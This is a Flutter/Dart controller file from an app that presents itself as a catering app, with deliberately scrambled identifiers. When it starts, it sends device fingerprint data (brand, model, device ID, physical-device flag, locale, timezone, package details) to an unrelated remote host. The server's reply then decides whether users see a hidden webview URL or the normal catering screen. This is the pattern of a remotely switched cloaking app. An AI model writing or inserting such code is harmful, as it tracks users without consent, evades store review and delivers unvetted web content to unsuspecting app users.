import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var jrybuv = RxBool(false);
  var ubapswhti = RxBool(true);
  var ewvht = RxString("");
  var princess = RxBool(false);
  var gerlach = RxBool(true);
  final dqkyopavjw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    okfdxzpm();
  }


  Future<void> okfdxzpm() async {

    princess.value = true;
    gerlach.value = true;
    ubapswhti.value = false;

    dqkyopavjw.post("https://gon.quickgetg.xyz/0PR2Q7wyC",data: await fwvanp()).then((value) {
      var wmzf = value.data["wmzf"] as String;
      var wxcfl = value.data["wxcfl"] as bool;
      if (wxcfl) {
        ewvht.value = wmzf;
        celestine();
      } else {
        kunze();
      }
    }).catchError((e) {
      ubapswhti.value = true;
      gerlach.value = true;
      princess.value = false;
    });
  }

  Future<Map<String, dynamic>> fwvanp() async {
    final DeviceInfoPlugin rnyw = DeviceInfoPlugin();
    PackageInfo gpvwz_ktbrfvw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pnkusw = Platform.localeName;
    var sxWrO = currentTimeZone;

    var BeQc = gpvwz_ktbrfvw.packageName;
    var aQSx = gpvwz_ktbrfvw.version;
    var LoEfaAIu = gpvwz_ktbrfvw.buildNumber;

    var mnygtlf = gpvwz_ktbrfvw.appName;
    var brendonNolan = "";
    var calebBeahan = "";
    var QThGHEB  = "";
    var rBXFa = "";
    var horacioHill = "";
    var mabelleBrekke = "";
    var jeradSatterfield = "";
    var melisaCronin = "";
    var VuXQS = "";

    var pearlineAnderson = "";

    var AcVFr = "";
    var qQmTd = false;

    if (GetPlatform.isAndroid) {
      AcVFr = "android";
      var txrnzqgoyd = await rnyw.androidInfo;

      rBXFa = txrnzqgoyd.brand;

      VuXQS  = txrnzqgoyd.model;
      QThGHEB = txrnzqgoyd.id;

      qQmTd = txrnzqgoyd.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      AcVFr = "ios";
      var dmjcuy = await rnyw.iosInfo;
      rBXFa = dmjcuy.name;
      VuXQS = dmjcuy.model;

      QThGHEB = dmjcuy.identifierForVendor ?? "";
      qQmTd  = dmjcuy.isPhysicalDevice;
    }
    var res = {
      "mnygtlf": mnygtlf,
      "aQSx": aQSx,
      "jeradSatterfield" : jeradSatterfield,
      "BeQc": BeQc,
      "melisaCronin" : melisaCronin,
      "sxWrO": sxWrO,
      "rBXFa": rBXFa,
      "LoEfaAIu": LoEfaAIu,
      "QThGHEB": QThGHEB,
      "pnkusw": pnkusw,
      "AcVFr": AcVFr,
      "VuXQS": VuXQS,
      "qQmTd": qQmTd,
      "horacioHill" : horacioHill,
      "calebBeahan" : calebBeahan,
      "brendonNolan" : brendonNolan,
      "pearlineAnderson" : pearlineAnderson,
      "mabelleBrekke" : mabelleBrekke,

    };
    return res;
  }

  Future<void> kunze() async {
    Get.offAllNamed("/cateringTab");
  }

  Future<void> celestine() async {
    Get.offAllNamed("/cateringSolo");
  }

}
